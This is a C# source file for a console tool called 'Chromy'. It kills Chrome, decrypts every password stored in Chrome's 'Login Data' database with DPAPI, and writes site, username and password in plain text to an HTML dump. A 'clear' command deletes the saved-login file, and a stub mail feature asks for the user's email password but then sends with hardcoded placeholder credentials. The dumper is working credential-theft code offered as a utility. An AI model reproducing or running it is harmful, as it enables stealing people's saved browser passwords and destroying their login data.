using Chromy.core;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading;

namespace Chromy
{
    class Program
    {
        static void Main(string[] args)
        {
            // Set Header
            PrintMe.PrintHeader();

            #region Load

            Console.Write("                               Performing some task... ");
            using (var progress = new ProgressBar())
            {
  
                for (int i = 0; i <= 100; i++)
                {


                    progress.Report((double)i / 100);
                    Thread.Sleep(10);
                }
            }
            Console.WriteLine("Done. Type 'help' for help.");
            #endregion

            if (!CheckFileDb())
                PrintMe.PrintInfo("ERR ", ConsoleColor.Red, "No databse file found.");

            while (true)
                ReadCommand();

          //  Console.ReadLine();
        }

        private static bool CheckFileDb()
        {
            string db_way = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                    + "/Google/Chrome/User Data/Default/Login Data";
            if (File.Exists(db_way))
                return true;
            else
                return true;
        }

        private static string ReadCommand()
        {

            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\n$> ");
            var cmd = Console.ReadLine().ToLower();

            if (cmd == "help")
            {
                PrintMe.PrintHelp();
            }
            else if (cmd == "dump" && !cmd.Contains("-p"))
            {
                // DUMP COMMAND 

                var rows = Decrypt("");
                if (rows == 0)
                {
                    PrintMe.PrintInfo("ERR ", ConsoleColor.Red, $"$> Something goes wrong.. Retry");
                    return null;
                }

                PrintMe.PrintInfo(" OK ", ConsoleColor.Green, $"$> DUMP DONE! {rows} Items.");
            }
            else if (cmd.Contains("dump -p") && !cmd.Contains("-d"))
            {
                // DUMP PATH COMMAND 

                var spath = cmd.Split('-');

                // remove 'p'
                spath[1] = spath[1].Remove(0, 1);
                var rows = Decrypt(spath[1]);

                if (rows == 0)
                {
                    PrintMe.PrintInfo("ERR ", ConsoleColor.Red, $"$> Something goes wrong.. Retry");
                    return null;
                }

                PrintMe.PrintInfo(" OK ", ConsoleColor.Green, $"$> DUMP DONE! {rows} Items.");
            }
            else if ((cmd.Contains("-d") && cmd.Contains("dump -d")) && !cmd.Contains("-p"))
            {
                // DUMP DESKTOP
                var rows = Decrypt(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                if (rows == 0)
                {
                    PrintMe.PrintInfo("ERR ", ConsoleColor.Red, $"$> Something goes wrong.. Retry");
                    return null;
                }
                PrintMe.PrintInfo(" OK ", ConsoleColor.Green, $"$> DUMP DONE! {rows} Items.");
            }
            else if (cmd == "clear" && !cmd.Contains("dump -d") && !cmd.Contains("-p"))
            {
                KillChrome();
                Thread.Sleep(20);
                string db_way = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                 + "/Google/Chrome/User Data/Default/Login Data"; // path to database file
                try
                {
                    File.Delete(db_way);
                }
                catch
                {
                    Thread.Sleep(20);
                    string db_way1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                     + "/Google/Chrome/User Data/Default/Login Data"; // path to database file
                    try
                    {
                        File.Delete(db_way1);
                    }
                    catch
                    {

                    }
                }

                PrintMe.PrintInfo(" OK ", ConsoleColor.Green, $"$> CLEAR DONE!");
            }
            else if (cmd.Contains("dump") && cmd.Contains("-m") && !cmd.Contains("-d") && !cmd.Contains("-p"))
            {
                // DUMP MAIL COMMAND 

                PrintMe.PrintInfo("INFO", ConsoleColor.Yellow, $"$> Attention: This method send an email from your account to your same account. If you use double autentication this may not work. Password are not saved or logged. Email system use TSL/SSL");

                Console.Write("$> Your Email (i.e. format@mail.com): ");
                var mail = Console.ReadLine().ToLower();
                Console.Write("$> Your Email Password (Requied for your SMTP Server aka smtp.google.com): ");
                var pwd = Console.ReadLine().ToLower();

                MailMessage m = new MailMessage()
                {

                };
                SendMail(mail, pwd, m);

                PrintMe.PrintInfo("  ", ConsoleColor.Red, $"$> Not working now.");

                
            }
            return null;
        }

        private static void KillChrome()
        {
            var chromeInstances = Process.GetProcessesByName("chrome");

            foreach (Process p in chromeInstances)
                p.Kill();
        }

        public static void SendMail(string mail, string pwd, MailMessage Message)
        {
            SmtpClient client = new SmtpClient();
            client.Host = "smtp.googlemail.com";
            client.Port = 587;
            client.UseDefaultCredentials = false;
            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            client.EnableSsl = true;
            client.Credentials = new NetworkCredential("myemail@gmail.com", "password");
            client.Send(Message);
        }

        private static int Decrypt(string path)
        {
            try
            {

                PrintMe.PrintInfo("INFO", ConsoleColor.Yellow, $"$> Killing Chrome");
                KillChrome();
                Thread.Sleep(20);
                if (path == "")
                    path += "ChromyDump.html";
                else
                     path += "\\ChromyDump.html";
                StreamWriter Writer = new StreamWriter(path, false, Encoding.UTF8);
                string db_way = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                    + "/Google/Chrome/User Data/Default/Login Data"; // path to database file
                //Console.WriteLine("$> DB file = " + db_way);


                string db_field = "logins";   // DB table field name
                byte[] entropy = null; // DPAPI class does not use entropy but requires this parameter
                string description;    // I could not understand the purpose of a this mandatory parameter
                                       // Output always is Null
                                       // Connect to DB

                string ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
                DataTable DB = new DataTable();
                string sql = string.Format("SELECT * FROM {0} {1} {2}", db_field, "", "");
                int rows = 0;
                // for better closing use using key
                using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
                {
                    SQLiteCommand command = new SQLiteCommand(sql, connect);
                    SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                    adapter.Fill(DB);
                       rows = DB.Rows.Count;
                    for (int i = 0; i < rows; i++)
                    {
                        Writer.Write(i + 1 + "] "); // Here we print order number of our trinity "site-login-password"
                        Writer.WriteLine(DB.Rows[i][1] + "<br>"); // site URL
                        Writer.WriteLine(DB.Rows[i][3] + "<br>"); // login
                                                                  // Here the password description
                        byte[] byteArray = (byte[])DB.Rows[i][5];
                        byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                        string password = new UTF8Encoding(true).GetString(decrypted);
                        Writer.WriteLine(password + "<br><br>");
                    }
                }

                Writer.Close();
                return rows;
            }
            catch (Exception ex)
            {
                    PrintMe.PrintInfo("ERR ", ConsoleColor.Red, ex.Message);
                // Console.WriteLine(ex.Message);
            //    ex = ex.InnerException;
                return 0;
            }
            
        }
    }
}

